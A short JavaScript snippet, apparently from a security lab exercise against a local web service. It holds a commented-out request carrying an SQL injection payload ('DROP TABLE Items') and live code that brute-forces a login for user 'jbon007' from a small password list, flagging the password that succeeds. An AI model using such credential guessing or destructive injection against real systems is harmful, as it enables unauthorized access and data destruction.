console.log("run");
/*fetch(`http://localhost:8188/DairyService.svc/search?term=DROP TABLE Items`, {
  method: "GET",
  headers: {
    "Content-Type": "application/json",
  },
}).then(console.log("done"));*/
//using (SQLiteCommand command = new SQLiteCommand("SELECT * FROM Items WHERE Id = @id"))
list = ["a", "b", "jbon007passwd"];
breakB = false;
console.log("here");
list.forEach((element) => {
  var xhr = new XMLHttpRequest();
  xhr.open(
    "GET",
    `http://localhost:8189/Service.svc/id`,
    true,
    "jbon007",
    element
  );
  xhr.withCredentials = true;
  xhr.addEventListener("readystatechange", function () {
    if (this.readyState === 4) {
      console.log(this.responseText);
      if (this.responseText.includes("Fault ")) {
        console.error(".");
      } else {
        if (
          this.responseText.includes(
            "Thank you for purchasing Fromage frais fruit"
          )
        ) {
          document.getElementById("works").innerHTML += `<br>${element}<br>`;
          console.log(this.responseText);
          breakB = true;
        }
      }
    }
  });
  xhr.send();
  //console.log(xhr.status);
});
//*/
